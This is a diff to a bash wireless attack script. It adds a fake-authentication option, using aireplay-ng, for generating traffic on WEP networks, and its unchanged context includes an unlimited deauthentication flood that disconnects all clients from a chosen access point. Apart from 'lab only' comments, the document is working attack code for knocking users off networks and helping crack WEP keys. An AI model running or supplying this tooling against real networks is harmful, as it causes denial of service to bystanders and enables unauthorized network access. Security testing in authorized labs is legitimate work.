@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # wireless_scan_capture.sh
 # Last Edited by Charles Duoto on November 16, 2026
-# Interactive dual-band scanner + targeted capture + optional deauth.
+# Interactive dual-band scanner + targeted capture + optional deauth/fakeauth.
 # Pure bash. Requires monitor mode already enabled.
 # Authorized lab environments only.
 #
@@ -97,10 +97,14 @@ echo
 echo "[*] Selected: $BSSID ($ESSID) on channel $CHANNEL"
 echo "1) Targeted packet capture only"
 echo "2) Targeted capture + deauth (lab handshake collection)"
-read -rp "Choice [1/2]: " ACTION
+echo "3) Targeted capture + fake auth (generate traffic for WEP)"
+read -rp "Choice [1/2/3]: " ACTION
 
 CAP_PREFIX="${PWD}/capture_${BSSID//:/}"
 echo "[*] Writing capture to ${CAP_PREFIX}-01.cap"
+
+# Get the MAC of our interface for fakeauth
+OUR_MAC=$(ip link show "$IFACE" | grep -oP '(?<=link/ether )[^ ]+' || ifconfig "$IFACE" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1)
 
 if [[ "$ACTION" == "2" ]]; then
     echo "[*] Starting targeted capture in background..."
@@ -110,6 +114,20 @@ if [[ "$ACTION" == "2" ]]; then
     echo "[*] Sending deauth packets (Ctrl+C to stop)..."
     echo "[!] Lab use only. This will disconnect clients from the selected AP."
     aireplay-ng --deauth 0 -a "$BSSID" "$IFACE" || true
+    kill "$DUMP_PID" 2>/dev/null || true
+    wait "$DUMP_PID" 2>/dev/null || true
+elif [[ "$ACTION" == "3" ]]; then
+    if [[ -z "$OUR_MAC" ]]; then
+        echo "[-] Could not determine MAC of $IFACE"
+        exit 1
+    fi
+    echo "[*] Starting targeted capture in background..."
+    airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_PREFIX" "$IFACE" >/dev/null 2>&1 &
+    DUMP_PID=$!
+    sleep 3
+    echo "[*] Sending fake auth packets with $OUR_MAC (Ctrl+C to stop)..."
+    echo "[!] Lab use only. Useful for generating traffic on quiet WEP networks."
+    aireplay-ng --fakeauth 0 -a "$BSSID" -h "$OUR_MAC" "$IFACE" || true
     kill "$DUMP_PID" 2>/dev/null || true
     wait "$DUMP_PID" 2>/dev/null || true
 else
